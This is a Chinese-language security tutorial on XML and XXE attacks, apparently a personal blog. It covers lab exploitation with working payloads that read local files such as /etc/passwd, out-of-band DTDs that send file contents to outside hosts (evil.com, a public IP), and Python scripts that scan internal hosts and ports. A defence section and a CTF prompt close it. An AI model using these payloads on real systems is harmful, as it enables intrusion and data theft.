<p>XML的语言规范是由DTD（Document Type Definition）来控制，类似编程语言的语法，它定义了XML文档的合法构建模块，即声明了XML的内容格式规范。</p>
<p>DTD 的声明方式分为两种：内部 DTD 和外部 DTD ，其区别就在于：对 XML 文档中的元素、属性和实体的 DTD 的声明是在 XML 文档内部引用还是引用外部的 dtd 文件。</p>
<h4 id="内部引用">内部引用</h4>
<p>下面是一个内部DTD的XML示例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!--XML声明--&gt;</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!--DTD，文档类型声明--&gt;</span><br><span class="line">&lt;!DOCTYPE note [ #定义此文档是note类型</span><br><span class="line">&lt;!ELEMENT note (body)&gt; #定义note元素有一个元素：&quot;body&quot;</span><br><span class="line">&lt;!ELEMENT body (#PCDATA)&gt; #定义body元素为&quot;#PCDATA&quot;类型</span><br><span class="line">&lt;!ENTITY writer &quot;hello world&quot;&gt; #定义一个内部实体</span><br><span class="line">]&gt;</span><br><span class="line">&lt;!--文档元素--&gt;                                                                        </span><br><span class="line">&lt;note&gt;</span><br><span class="line">&lt;body&gt;&amp;writer;&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;note&gt;</span><br></pre></td></tr></table></figure>
<p>上面第7行定义了一个内部实体，第11行中对上面定义的writer实体进行了引用，到时候输出的时候&amp;writer就会被&quot;hello world&quot;替换。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;</span><br></pre></td></tr></table></figure>
<p>一个实体由三部分构成:&amp;符号, 实体名称, 分号 (😉，这里&amp;不论在GET还是在POST中都需要进行URL编码，因为是使用参数传入xml的，&amp;符号会被认为是参数间的连接符号</p>
<h4 id="外部引用">外部引用</h4>
<h5 id="通用实体">通用实体</h5>
<p>下面再来看看一个外部DTD的XML示例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">&lt;!ELEMENT foo ANY &gt; #定义元素为ANY，即可以接受任何元素。</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;c:&#x2F;test.dtd&quot; &gt;]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">&lt;body&gt;&amp;xxe;&lt;&#x2F;body&gt; #定义一个外部实体</span><br><span class="line">&lt;&#x2F;root&gt;</span><br></pre></td></tr></table></figure>
<p>通过第 4 行的定义， 第 7 行的 &amp;xxe 就会对 c:/test.dtd 文件资源进行 SYSTEM 关键字的引用，这样对引用资源所做的任何更改都会在文档中自动更新。</p>
<p>另外除了上面 SYSTEM 关键字的引用方式，还有一种引用方式是使用 PUBLIC 引用公用 DTD 的方式，语法如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素名称 PUBLIC “DTD标识名” “公用DTD的URI”&gt;</span><br></pre></td></tr></table></figure>
<p>这个在我们的攻击中也可以起到和 SYSTEM 一样的作用，但实际上实体远不止这一种，我们以上涉及的实体只是其中的一种，被称为通用实体。</p>
<h5 id="参数实体">参数实体</h5>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % an-element &quot;&lt;!ELEMENT mytag (subtag)&gt;&quot;&gt;</span><br><span class="line">&lt;!ENTITY % remote-dtd SYSTEM &quot;http:&#x2F;&#x2F;somewhere.example.org&#x2F;remote.dtd&quot;&gt;</span><br><span class="line">%an-element; %remote-dtd;</span><br></pre></td></tr></table></figure>
<p>在上面的代码示例中，可以看到实体名前多了一个 “%” ，在参数实体中使用 “% 实体名” (这里面的空格不能少) 定义，并且只能在 DTD 中使用 “% 实体名” 引用。</p>
<p>另外和通用实体一样，参数实体也可以外部引用，同时只有在 DTD 文件中，参数实体的声明才能引用其他实体。</p>
<h3 id="XML注入">XML注入</h3>
<p>下面是一个普通的XML注入例子：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 注入前XML代码</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;&gt;</span><br><span class="line">&lt;USER role&#x3D;&quot;admin&quot;&gt;用户输入位置&lt;&#x2F;USER&gt;</span><br></pre></td></tr></table></figure>
<p>当用户输入一些恶意代码，比如<code>User1&lt;/USER&gt;&lt;USER role=&quot;admin&quot;&gt;User2</code>，原XML代码就变成了下面的样子：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 注入后XML代码</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;&gt;</span><br><span class="line">&lt;USER role&#x3D;&quot;admin&quot;&gt;User1&lt;&#x2F;USER&gt;</span><br><span class="line">&lt;USER role&#x3D;&quot;admin&quot;&gt;User2&lt;&#x2F;USER&gt;</span><br></pre></td></tr></table></figure>
<p>可以看到通过XML语句的前后拼接， XML代码被插入了进去。</p>
<p>对普通的 XML 注入，利用面比较狭窄，现实中也是比较鸡肋的存在，因此几乎用不到，如果有的话应该也是逻辑漏洞，下面就重点介绍XXE的利用。</p>
<h2 id="XXE利用">XXE利用</h2>
<p><strong>实验环境</strong></p>
<p>目标靶机：</p>
<p>IP：192.168.0.104</p>
<p>环境：Win7+phpStudy+apache+php</p>
<p>本地主机：</p>
<p>IP：192.168.0.108</p>
<p>环境：Win10+phpStudy+apache+BurpSuite+Python3</p>
<h3 id="有回显读本地敏感文件（Normal-XXE）">有回显读本地敏感文件（Normal XXE）</h3>
<p>目标靶机：xxe_test.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  libxml_disable_entity_loader (<span class="literal">false</span>);</span><br><span class="line">  $xmlfile = file_get_contents(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line">  $dom = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">  $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">  $creds = simplexml_import_dom($dom);   <span class="keyword">echo</span> $creds;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>在C盘下新建一个flag.txt，内容我设置成了<code>XXE Payload Executed Successfully!!!</code>。</p>
<p>本地主机：payload</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">creds</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">goodies</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///c:/flag.txt&quot;</span>&gt;</span> </span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">creds</span>&gt;</span><span class="symbol">&amp;goodies;</span><span class="tag">&lt;/<span class="name">creds</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200130112525.png" alt=""></p>
<p>如果flag.txt中包含特殊符号，比如<code>&lt;&gt;&amp;&quot;'</code>等，例如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;XXE Payload Executed Successfully!!!&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200130113316.png" alt=""></p>
<p>可以看到当被读取文件中含有特殊符号时，返回了一堆错误，这个时候就需要使用CDATA了。（当然，更简单的使用base64编码）</p>
<blockquote>
<p>什么是CDATA：</p>
<p>CDATA，意为character data，是标记语言SGML与XML，表示文档的特定部分是普通的字符数据，而不是非字符数据或有特定、限定结构的字符数据。在XML文档或外部实体中，一个CDATA section是一段按字面解释的内容，不作为标记文本。字符用CDATA节表示或者按照标准语法表示，并无差异。</p>
<p>CDATA 部分由<code>&quot;&lt;![CDATA[&quot;</code>开始，由<code>&quot;]]&gt;&quot;</code>结束</p>
</blockquote>
<p>简单一点的来说，将脚本代码定义为CDATA后，CDATA部分中的内容就会被解析器忽略，这个时候就可以读取文件了。</p>
<p>本地主机：CDATA Payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE roottag [</span><br><span class="line">&lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;  </span><br><span class="line">&lt;!ENTITY % goodies SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;c:&#x2F;flag.txt&quot;&gt;</span><br><span class="line">&lt;!ENTITY % end &quot;]]&gt;&quot;&gt;</span><br><span class="line">&lt;!ENTITY % dtd SYSTEM &quot;http:&#x2F;&#x2F;192.168.0.109&#x2F;evil.dtd&quot;&gt; %dtd;]&gt;</span><br><span class="line">&lt;roottag&gt;&amp;all;&lt;&#x2F;roottag&gt;</span><br></pre></td></tr></table></figure>
<p>本地主机：evil.dtd</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!ENTITY all &quot;%start;%goodies;%end;&quot;&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200130142215.png" alt=""></p>
<p>利用带有CDATA的Payload，可以看到特殊符号被成功绕过。</p>
<p>但是在真实情况下，服务器上的XML一般用于配置文件或者传输数据，而不是显示数据，因此在现实环境下利用这个漏洞就需要找到不依靠回显的方法。</p>
<h3 id="无回显读取本地敏感文件（Blind-XXE）">无回显读取本地敏感文件（Blind XXE）</h3>
<h4 id="payload1">payload1</h4>
<p>目标靶机：xxe_blind_test.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  libxml_disable_entity_loader (<span class="literal">false</span>);</span><br><span class="line">  $xmlfile = file_get_contents(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line">  $dom = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">  $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>本地主机：Payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE convert [</span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http:&#x2F;&#x2F;192.168.0.109&#x2F;evil.dtd&quot;&gt;</span><br><span class="line">%remote;%int;%send;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
<p>本地主机：evil.dtd</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;file:&#x2F;&#x2F;&#x2F;c:&#x2F;flag.txt&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#39;http:&#x2F;&#x2F;47.97.199.89:9999?p&#x3D;%file;&#39;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>
<p>结果如下：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200201185338.png" alt=""></p>
<p>看到服务器端接收到了我们用 base64 编码后的敏感文件信息(编码也是为了不破坏原本的XML语法，不编码会报错）。</p>
<blockquote>
<p>目标靶机的网络出了点问题，IP地址换成了192.168.50.130</p>
</blockquote>
<p>现在我们再来回顾一下Payload的调用过程：</p>
<p>连续调用了三个参数实体 <code>%remote;%int;%send;</code>，这就是我们的利用顺序，%remote 先调用，调用后请求远程服务器上的 evil.dtd ，有点类似于将 evil.dtd 包含进来，然后 %int 调用 evil.dtd 中的 %file, %file 就会去获取服务器上面的敏感文件，然后将 %file 的结果填入到 %send 以后(因为实体的值中不能有 %, 所以将其转成html实体编码 <code>&amp;#37;</code>)，我们再调用 %send; 把我们的读取到的数据发送到我们的远程服务器上，这样就实现了外带数据的效果，解决了 XXE 无回显的问题。</p>
<h4 id="payload2">payload2</h4>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE data [</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;c:&#x2F;&#x2F;TEST.txt&quot;&gt;</span><br><span class="line">&lt;!ENTITY % dtd SYSTEM &quot;http:&#x2F;&#x2F;yourvps&#x2F;xxe.xml&quot;&gt;</span><br><span class="line">%dtd; %all;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;value&gt;&amp;send;&lt;&#x2F;value&gt;</span><br></pre></td></tr></table></figure>
<p>在我的vps的xxe.xml的内容如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % all &quot;&lt;!ENTITY send SYSTEM &#39;http:&#x2F;&#x2F;yourvps&#x2F;%file;&#39;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>
<p>而测试文件TEST.txt内容为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">chybeta</span><br></pre></td></tr></table></figure>
<p>整个的调用过程如下：解析时<code>%dtd</code>引入xxe.xml，之后<code>%all</code>引入<code>send</code>的定义，最后引用了实体send，把<code>%file</code>文件内容通过一个http请求发了出去。注意需要把payload经过url编码。查看vps上的access.log：</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170704/4.jpg?raw=true" alt="img"></p>
<p>若要读取php等文件，同样需要先经过base64加密下。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE data [</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;index.php&quot;&gt;</span><br><span class="line">&lt;!ENTITY % dtd SYSTEM &quot;http:&#x2F;&#x2F;yourvps&#x2F;xxe.xml&quot;&gt;</span><br><span class="line">%dtd; %all;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;value&gt;&amp;send;&lt;&#x2F;value&gt;</span><br></pre></td></tr></table></figure>
<h3 id="思考">思考</h3>
<p>我们刚刚都只是做了一件事，那就是通过 file 协议读取本地文件，或者是通过 http 协议发出请求，熟悉 SSRF 的童鞋应该很快反应过来，这其实非常类似于 SSRF ，因为他们都能从服务器向另一台服务器发起请求，那么我们如果将远程服务器的地址换成某个内网的地址，（比如 192.168.0.10:8080）是不是也能实现 SSRF 同样的效果呢？没错，XXE 其实也是一种 SSRF 的攻击手法，因为 SSRF 其实只是一种攻击模式，利用这种攻击模式我们能使用很多的协议以及漏洞进行攻击。</p>
<p>所以要想更进一步的利用我们不能将眼光局限于 file 协议，我们必须清楚地知道在何种平台，我们能用何种协议：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200201214217.png" alt=""></p>
<h3 id="HTTP内网探测主机">HTTP内网探测主机</h3>
<p><a href="http://xn--inhostscan-5i2pu68rs6giudtu5ago6eof2d.py">下面是探测脚本inhostscan.py</a>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">XXE</span>(<span class="params">ip,string</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        xml = <span class="string">&quot;&quot;&quot;&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&quot;&quot;&quot;</span></span><br><span class="line">        xml = xml + <span class="string">&quot;\r\n&quot;</span> + <span class="string">&quot;&quot;&quot;&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt;&quot;&quot;&quot;</span></span><br><span class="line">        xml = xml + <span class="string">&quot;\r\n&quot;</span> + <span class="string">&quot;&quot;&quot;&lt;!ENTITY xxe SYSTEM &quot;&quot;&quot;</span> + <span class="string">&#x27;&quot;&#x27;</span> + string + <span class="string">&#x27;&quot;&#x27;</span> + <span class="string">&quot;&quot;&quot;&gt;]&gt;&quot;&quot;&quot;</span></span><br><span class="line">        xml = xml + <span class="string">&quot;\r\n&quot;</span> + <span class="string">&quot;&quot;&quot;&lt;xml&gt;&quot;&quot;&quot;</span></span><br><span class="line">        xml = xml + <span class="string">&quot;\r\n&quot;</span> + <span class="string">&quot;&quot;&quot;    &lt;stuff&gt;&amp;xxe;&lt;/stuff&gt;&quot;&quot;&quot;</span></span><br><span class="line">        xml = xml + <span class="string">&quot;\r\n&quot;</span> + <span class="string">&quot;&quot;&quot;&lt;/xml&gt;&quot;&quot;&quot;</span></span><br><span class="line">        x = requests.post(<span class="string">&#x27;http://192.168.50.132/xxe_blind_test.php&#x27;</span>, data=xml, headers=headers, timeout=<span class="number">5</span>).text</span><br><span class="line">        coded_string = x.split(<span class="string">&#x27; &#x27;</span>)[<span class="number">-2</span>]</span><br><span class="line">        print(<span class="string">&#x27; [+]&#x27;</span>,ip,<span class="string">&#x27;Successfully Found !!!&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        print(<span class="string">&#x27; [-]&#x27;</span>,ip,<span class="string">&#x27;Error Not Found !!!&#x27;</span>)  </span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    headers = &#123;<span class="string">&#x27;Content-Type&#x27;</span>:<span class="string">&#x27;application/xml&#x27;</span>&#125;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">255</span>):</span><br><span class="line">        ip = <span class="string">&#x27;192.168.50.&#x27;</span> + str(i)</span><br><span class="line">        string = <span class="string">&#x27;php://filter/convert.base64-encode/resource=http://&#x27;</span> + ip + <span class="string">&#x27;/&#x27;</span></span><br><span class="line">        XXE(ip,string)</span><br></pre></td></tr></table></figure>
<p>注意替换一下IP地址的网段。这个脚本跑的确实很慢，结果如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[+] 192.168.50.1 Successfully Found !!!</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">[-] 192.168.50.130 Error Not Found !!!</span><br><span class="line">[-] 192.168.50.131 Error Not Found !!!</span><br><span class="line">[+] 192.168.50.132 Successfully Found !!!</span><br><span class="line">[+] 192.168.50.133 Successfully Found !!!</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<h3 id="HTTP内网主机探测端口">HTTP内网主机探测端口</h3>
<p>找到了内网的主机，还需要对其端口进行扫描，原理和上面一致，只不过IP固定，遍历端口，我们先用Burp Suite看一下端口开放和关闭的response有什么不同：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200206110812.png" alt=""></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200206110852.png" alt=""></p>
<p>如果端口是关闭的，一般都会返回Connection refuse。</p>
<p>下面放出Payload。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">XXE</span>(<span class="params">port</span>):</span></span><br><span class="line">    xml = <span class="string">&quot;&quot;&quot;&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &quot;&quot;&quot;</span></span><br><span class="line">    xml = xml + <span class="string">&quot;\r\n&quot;</span> + <span class="string">&quot;&quot;&quot;&lt;!DOCTYPE data SYSTEM &quot;http://192.168.50.132:&quot;&quot;&quot;</span> + str(port) + <span class="string">&quot;&quot;&quot;/&quot; [&quot;&quot;&quot;</span></span><br><span class="line">    xml = xml + <span class="string">&quot;\r\n&quot;</span> + <span class="string">&quot;&quot;&quot;&lt;!ELEMENT data (#PCDATA)&gt; &quot;&quot;&quot;</span></span><br><span class="line">    xml = xml + <span class="string">&quot;\r\n&quot;</span> + <span class="string">&quot;&quot;&quot;]&gt;&quot;&quot;&quot;</span></span><br><span class="line">    xml = xml + <span class="string">&quot;\r\n&quot;</span> + <span class="string">&quot;&quot;&quot;&lt;data&gt;7&lt;/data&gt;&quot;&quot;&quot;</span></span><br><span class="line">    r = requests.post(<span class="string">&#x27;http://192.168.50.132/xxe_blind_test.php&#x27;</span>, data=xml,timeout=<span class="number">5</span>)</span><br><span class="line">    <span class="comment">#print(port,r.elapsed.total_seconds())</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&quot;Connection refused&quot;</span> <span class="keyword">in</span> r.text):</span><br><span class="line">        print(<span class="string">&quot; [-]&quot;</span>, port, <span class="string">&quot; seems shut down&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">&quot; [+]&quot;</span>, port, <span class="string">&quot;is up&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">9080</span>,<span class="number">9082</span>):</span><br><span class="line">        XXE(i)</span><br></pre></td></tr></table></figure>
<blockquote>
<p>笔者测试发现不同的环境，结果可能会不一样，因此可能需要不同的payload进行端口扫描，这个需要具体结合代码和测试结果来敲定一个有效的payload。</p>
</blockquote>
<h2 id="如何挖掘XXE漏洞">如何挖掘XXE漏洞</h2>
<h3 id="常用检测方法">常用检测方法</h3>
<h4 id="首先查看XML是否可以成功解析">首先查看XML是否可以成功解析</h4>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;  </span><br><span class="line">&lt;!DOCTYPE ANY [  </span><br><span class="line">&lt;!ENTITY name &quot;test1&quot;&gt;]&gt;    </span><br><span class="line">&lt;root&gt;&amp;name;&lt;&#x2F;root&gt;</span><br></pre></td></tr></table></figure>
<p>如果页面输出了test1，则可以解析XML。</p>
<p>第二步查看是否支持DTD引用外部实体：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;”1.0” encoding&#x3D;”UTF-8”?&gt;  </span><br><span class="line">&lt;!DOCTYPE ANY [  </span><br><span class="line">&lt;!ENTITY % name SYSTEM &quot;http:&#x2F;&#x2F;myhost&#x2F;index.html&quot;&gt;  </span><br><span class="line">%name;  </span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
<p>然后在我的服务器上查看日志,如果有目标服务器向我的服务器发送了一条index.html的请求,说明<br>
支持引用外部实体,很有可能存在xxe漏洞。</p>
<h4 id="外部普通实体">外部普通实体</h4>
<p>当有回显时，利用file://协议:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;</span><br><span class="line">    &lt;!DOCTYPE lltest[</span><br><span class="line">    &lt;!ENTITY xxe SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;C:&#x2F;Windows&#x2F;win.ini&quot;&gt;</span><br><span class="line">]&gt; </span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;xxe;&lt;&#x2F;username&gt;&lt;password&gt;123456&lt;&#x2F;password&gt;&lt;&#x2F;user&gt;</span><br></pre></td></tr></table></figure>
<h4 id="外部参数实体">外部参数实体</h4>
<p>当无回显，使用http协议:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note[ </span><br><span class="line">&lt;!ENTITY % lltest SYSTEM &quot;http:&#x2F;&#x2F;myhost:1234&#x2F;test_xxe&quot;&gt;</span><br><span class="line">%lltest;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
<p>然后在myhost监听1234端口(dnslog地址也可以),查看是否有http请求。</p>
<h3 id="Json-Content-type-XXE">Json Content-type XXE</h3>
<p>很多Web与App应用都是基于客户端-服务器交互的Web通信服务,最常见的数据格式就是Json与XML，尽管web服务可能只使用一种格式，但是服务器却可以接收开发人员没有料到的其他数据格式，有可能导致Json节点受到XXE攻击。<br>
测试方法很简单,就是将<code>Content-Type: application/json</code>修改为<code>Content-Type: application/xml</code>，数据格式不变，查看是否报错:<br>
<code>&#123;&quot;errors&quot;:&#123;&quot;errorMessage&quot;:&quot;org.xml.sax.SAXParseException: XML document structures must start and end within the same entity.&quot;&#125;&#125;</code><br>
可以发现服务器是可以处理xml数据的，于是我们利用这个来进行攻击。<br>
payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line">Content-Type: application&#x2F;xml</span><br><span class="line">...</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE netspi [&lt;!ENTITY xxe SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot; &gt;]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">&lt;param1&gt;name&lt;&#x2F;param1&gt;</span><br><span class="line">&lt;param2&gt;&amp;xxe;&lt;&#x2F;param2&gt;</span><br><span class="line">&lt;&#x2F;root&gt;</span><br></pre></td></tr></table></figure>
<p>查看是否可以读取敏感文件。</p>
<h3 id="利用FTP协议获取敏感信息">利用FTP协议获取敏感信息</h3>
<p>利用ftp协议获取服务器信息/内网ip之类的技巧：<br>
在攻击者服务器上运行rb脚本(模拟FTP服务器:<a href="https://github.com/ONsec-Lab/scripts/blob/master/xxe-ftp-server.rb">https://github.com/ONsec-Lab/scripts/blob/master/xxe-ftp-server.rb</a>),监听8080端口。<br>
然后在web程序那里输入payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE a [</span><br><span class="line">   &lt;!ENTITY % asd SYSTEM &quot;http:&#x2F;&#x2F;evil.com&#x2F;ext.dtd&quot;&gt; </span><br><span class="line">   %asd; </span><br><span class="line">   %rrr; </span><br><span class="line">]&gt;</span><br><span class="line">&lt;a&gt;&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure>
<p>ext.dtd</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % b SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % c &quot;&lt;!ENTITY &amp;#37; rrr SYSTEM &#39;ftp:&#x2F;&#x2F;evil.com:8000&#x2F;%b;&#39;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>
<p>然后在模拟的FTP服务器上就会收到一些服务器信息/文件内容</p>
<p>技巧来自：<a href="http://lab.onsec.ru/2014/06/xxe-oob-exploitation-at-java-17.html">http://lab.onsec.ru/2014/06/xxe-oob-exploitation-at-java-17.html</a></p>
<h3 id="Bypass">Bypass</h3>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE :. SYTEM &quot;http:&#x2F;&#x2F;&quot;</span><br><span class="line">&lt;!DOCTYPE :_-_: SYTEM &quot;http:&#x2F;&#x2F;&quot;</span><br><span class="line">&lt;!DOCTYPE &#123;0xdfbf&#125; SYSTEM &quot;http:&#x2F;&#x2F;&quot;</span><br></pre></td></tr></table></figure>
<h2 id="XXE如何防御">XXE如何防御</h2>
<p>1、使用开发语言提供的禁用外部实体的方法<br>
php:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">libxml_disable_entity_loader(true);</span><br></pre></td></tr></table></figure>
<p>java:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DocumentBuilderFactory dbf &#x3D;DocumentBuilderFactory.newInstance();</span><br><span class="line">dbf.setExpandEntityReferences(false);</span><br></pre></td></tr></table></figure>
<p>Python:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from lxml import etree</span><br><span class="line">xmlData &#x3D; etree.parse(xmlSource,etree.XMLParser(resolve_entities&#x3D;False))</span><br></pre></td></tr></table></figure>
<p>2、过滤用户提交的XML数据<br>
过滤关键字：<code>&lt;\!DOCTYPE</code>和<code>&lt;\!ENTITY</code>，或者<code>SYSTEM</code>和<code>PUBLIC</code>。<br>
3、不允许XML中含有自己定义的DTD</p>
<h2 id="CTF中的XXE">CTF中的XXE</h2>
<h3 id="api调用">api调用</h3>
<p>题目地址：<a href="http://web.jarvisoj.com:9882/">http://web.jarvisoj.com:9882/</a></p>
<p>题目描述：请设法获得目标机器/home/ctf/flag.txt中的flag值。</p>
